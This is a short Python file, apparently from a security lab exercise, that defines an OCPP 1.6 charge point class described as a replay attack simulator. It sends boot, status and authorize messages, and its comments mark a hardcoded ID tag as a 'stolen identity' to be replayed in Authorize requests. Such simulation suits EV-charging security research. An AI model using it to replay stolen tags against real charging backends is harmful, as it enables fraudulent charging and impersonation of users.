import asyncio
import logging
from ocpp.v16 import ChargePoint as Cp
from ocpp.v16 import call
from ocpp.v16.enums import ChargePointStatus

class MelikReplayCP(Cp):
    """
    Profesyonel Replay Attack Simülatörü.
    Bu sınıf, meşru paketleri yakalayıp tekrar gönderme yeteneğine sahiptir.
    """
    def __init__(self, cp_id, connection):
        super().__init__(cp_id, connection)
        self.id_tag = "MELIK_SECURE_TAG" # Çalınan kimlik # [cite: 275, 280]

    async def send_boot(self):
        """İstasyonu sisteme tanıtır.""" # [cite: 216, 257]
        req = call.BootNotification(
            charge_point_vendor="SecurityLab-Melik",
            charge_point_model="Advanced-Replay-Unit"
        )
        return await self.call(req)

    async def send_authorize(self, tag=None):
        """Yetkilendirme isteği gönderir. Replay saldırısının ana hedefidir.""" # [cite: 217, 280]
        target = tag if tag else self.id_tag
        req = call.Authorize(id_tag=target)
        return await self.call(req)

    async def update_status(self, status: ChargePointStatus):
        """İstasyon durumunu günceller (Charging, Available vb.).""" # [cite: 62, 221]
        req = call.StatusNotification(
            connector_id=1,
            error_code="NoError",
            status=status
        )
        await self.call(req)
